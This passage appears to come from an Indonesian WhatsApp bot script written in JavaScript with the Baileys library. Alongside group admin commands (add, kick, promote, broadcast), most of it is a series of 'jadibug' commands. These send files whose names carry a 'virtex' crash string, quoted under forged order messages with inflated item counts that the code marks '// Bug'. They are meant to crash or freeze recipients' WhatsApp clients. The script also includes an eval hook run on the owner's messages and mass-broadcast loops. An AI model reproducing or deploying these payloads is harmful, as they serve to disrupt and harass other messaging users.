‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏
`
kurzxd.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`hm/vvirgamv2.jpeg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`hm/vvirgamv2.jpeg`),"itemCount":999999999,"status":"INQUIRY","surface":"CATALOG","message":` BODY `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
python = fs.readFileSync(`./logo.jpg`)
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', python, image)

imeg = imeu.message.imageMessage
res = await kurzxd.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": emoji2(prefix),
"description": ngazap(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62853393885127@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  kurzxd.relayWAMessage(res)
 await kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
 kurzxd.toggleDisappearingMessages(from, 7 * 24 * 60 * 60)
 break
					case 'add':
					if (!kurz.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
				if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						kurzxd.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
					case 'demote':
					if (!kurz.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
					if (kurz.message.extendedTextMessage === undefined || kurz.message.extendedTextMessage === null) return reply('*Tag target yang ingin di turunkan admin group!*')
					mentioned = kurz.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Perintah diterima, menurunkan jadi admin group* :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						kurzxd.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`*Perintah diterima, menurunkan* @${mentioned[0].split('@')[0]} *jadi admin group*`, mentioned, true)
						kurzxd.groupDemoteAdmin(from, mentioned)
					}
					break
case 'bc':
if (!isOwner) return reply('LU BUKAN OWNER GBLOK')
if (args.length < 1) return reply('.......')
anu = await kurzxd.chats.all()
if (isMedia && !kurz.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
bc = await kurzxd.downloadMediaMessage(encmedia)
for (let _ of anu) {
kurzxd.sendMessage(_.jid, bc, image, { caption: `[ Izin Broadcast ]\n\n${body.slice(4)}` })
}
reply('Suksess broadcast')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ *BOT BROADCAST* ]\n\n${body.slice(4)}`)
}
reply('Suksess broadcast')
}
break
case 'bcnowm': 
        if (!kurz.key.fromMe) return reply('lu siapa??')
if (!q)return reply(`Reply image , video , atau teks biasa dan Masukan Ingfo`)
bcc = await kurzxd.chats.all()
if (isMedia && !kurz.message.imageMessage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
let media = await kurzxd.downloadMediaMessage(encmedia)
for (let i of bcc){
kurzxd.sendMessage(i.jid, media, image, {contextInfo: { forwardingScore: 9999, isForwarded:true},caption: `${q}`})
}
reply(`Sukses`)
} else if (isMedia && !kurz.message.videoMessage || isQuotedVideo) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mem).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
bc = await kurzxd.downloadMediaMessage(encmedia)
for (let _ of bcc) {
kurzxd.sendMessage(_.jid, bc, video, {caption: `${q}`})
}
reply('Suksess broadcast')
}	else {
for (let _ of bcc) {
sendMess(_.jid, `${q}`)
	}
reply(`Succses BroadCast ${totalchat.length} Total chat`)
		}
break			   
			case 'promote':
			if (!kurz.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
					if (kurz.message.extendedTextMessage === undefined || kurz.message.extendedTextMessage === null) return reply('*Tag target yang ingin di jadikan admin group!*')
					mentioned = kurz.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Selamat* 🥳 *Anda naik menjadi admin group* 🎉 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						kurzxd.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`*Selamat* 🥳 @${mentioned[0].split('@')[0]} *Anda naik menjadi admin group* 🎉`, mentioned, true)
						kurzxd.groupMakeAdmin(from, mentioned)
					}
					break
					case 'group':
if (!kurz.key.fromMe) return reply('Lu siapa')
if (!isGroupAdmins) return reply('No admin kurz')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
if (args[0] === 'buka') {
kurzxd.groupSettingChange(from, GroupSettingChange.messageSend, false)
reply(`Sukses membuka akses grup ${groupName}`)
} else if (args[0] === 'tutup') {
kurzxd.groupSettingChange(from, GroupSettingChange.messageSend, true)
reply(`Sukses menutup akses ${groupName}`)
}
break
						case 'owner':
                  case 'creator':
                  kurzxd.sendMessage(from, {displayname: "Jeff", vcard: vcard}, MessageType.contact, { quoted: kurz})
                  kurzxd.sendMessage(from, 'Tuh nomer owner ku',MessageType.text, { quoted: kurz} )
					break    
				  case 'lirik':
            if(!q) return reply('lagu apa?')
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
            case 'kick':
            if (!kurz.key.fromMe) return reply('Lu siapa')
					if (!isGroup) return reply(groupo())
					if (!isGroupAdmins) return reply(admin())
						if (kurz.message.extendedTextMessage === undefined || kurz.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = kurz.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *_ASEK DAPAT JATAH KICK_*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						kurzxd.groupRemove(from, mentioned)
					} else {
						mentions(`╭────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						kurzxd.groupRemove(from, mentioned)
					}
					break
case 'jadiphilips':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.txt`, mimetype: 'application/txt'})
}
break
case 'jadiphilipsv2':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.txt`, mimetype: 'application/txt'})
}
break
case 'jadibugpdf':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.pdf`, mimetype: 'application/pdf'})
}
break
case 'jadibugpdfv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.pdf`, mimetype: 'application/pdf'})
}
break
case 'jadibugjson':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.json`, mimetype: 'application/json'})
}
break
case 'jadibugjsonv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.json`, mimetype: 'application/json'})
}
break
case 'jadibugjs':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.js`, mimetype: 'application/js'})
}
break
case 'jadibugjsv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.js`, mimetype: 'application/js'})
}
break
case 'jadibugxml':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.xml`, mimetype: 'application/xml'})
}
break
case 'jadibugxmlv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.xml`, mimetype: 'application/xml'})
}
break
case 'jadibugzip':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxdï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.zip`, mimetype: 'application/zip'})
}
break
case 'jadibugzipv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.zip`, mimetype: 'application/zip'})
}
break
case 'jadibug7z':
if (!q) return reply(`Teks?`)
 if ((isMedia && !kurz.message.videoMessage || isQuotedImage)) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, image)
   imeg = imeu.message.imageMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.7z`, mimetype: 'application/x-7z-compressed'})
}
break
case 'jadibug7zv2':
if (!q) return reply(`Teks?`)
if ((isMedia && !kurz.message.videoMessage || isQuotedSticker)) {
   let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(kurz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : kurz
   let media = await kurzxd.downloadMediaMessage(encmedia)
   imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', media, sticker)
   imeg = imeu.message.stickerMessage
   res = `${q}               ${spamvirtex}`
   kurzxd.sendMessage(from, imeg, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzï¸',
    orderTitle: 'bugdocã€½', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${res}.7z`, mimetype: 'application/x-7z-compressed'})
}
break
                break
					break
                  break
			  default:
		if (hour_now >= '02:00' && hour_now <= '04:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Waktunya sahur kak, Main botnya buat nanti lagi, Sebelum makan jangan lupa baca Doa ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '04:00' && hour_now <= '05:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak', 'yellow'), color('(😊)', 'white'))
          }
          if (hour_now >= '05:00' && hour_now <= '06:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Udah sholat Subuh belum kak', 'yellow'), color('(🙄)', 'white'))
          }
        if (hour_now >= '06:00' && hour_now <= '11:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Pagi kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
          if (hour_now >= '11:00' && hour_now <= '12:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Siang kak, Dah mandi blm kak?', 'yellow'), color('(🙄)', 'white'))
          }
          if (hour_now >= '12:00' && hour_now <= '14:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 12 kak, Jangan lupa sholat Dzuhur ya kak', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '14:00' && hour_now <= '15:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Sore kak, Jangan lupa mandi', 'yellow'), color('(😅)', 'white'))
          }
        if (hour_now >= '15:00' && hour_now <= '16:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Dah jam 3 kak, Jangan lupa sholat Ashar ya kak', 'yellow'), color('(😊)', 'white'))
          }
        if (hour_now >= '17:00' && hour_now <= '18:00') {
          console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi buka kak, Sabar ya kak', 'yellow'), color('(😆)', 'white'))
          }
        if (hour_now >= '18:00' && hour_now <= '19:00') {
        	console.log(color('[Pesan Bot]', 'cyan'), color('Alhamdulillah, Dh magrib jan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
        }
        if (hour_now >= '19:00' && hour_now <= '20:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bentar lagi jam 8 gak mabar kak?', 'yellow'), color('(😊)', 'white'))
           }
        if (hour_now >= '20:00' && hour_now <= '00:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Selamat malam kak, Jangan begadang ya kak, Tar sakit loh', 'yellow'), color('(😄)', 'white'))
        }
          if (hour_now >= '00:00' && hour_now <= '02:00') {
           console.log(color('[Pesan Bot]', 'cyan'), color('Bot ngantuk kak, tidur dulu ya kak', 'yellow'), color('(😴)', 'white'))
        }

     if (!kurz.key.fromMe) return;
        if (_chats.startsWith(">")) {
          try {
            return kurzxd.sendMessage(
              from,
              JSON.stringify(eval(budy.slice(2)), null, "\t"),
              text,
              { quoted: kurz }
            );
          } catch (err) {
            e = String(err);
            reply(e);
          }
        }
    }

    if (isGroup && budy != undefined) {
    } else {
      console.log(
        color("[BODY]", "red"),
        "𝘊𝘳𝘦𝘢𝘵𝘦𝘥 𝘉𝘺 Kurz Botz",
        color(sender.split("@")[0])
      );
    }
   } catch (e) {
    e = String(e);// Fixed Di Consolog 🌹
    if (!e.includes("this.isZero") && !e.includes("jid") && !e.includes("Cannot read property 'fromMe' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined") && !e.includes("Cannot read property 'key' of undefined") && !e.includes("Cannot use 'in' operator to search for 'text' in undefined")) {
      console.log("Message : %s", color(e, "yellow"));
    }
    // console.log(e)
  }
};
// 𝙈𝙚𝙣𝙜𝙜𝙖𝙗𝙪𝙩シ︎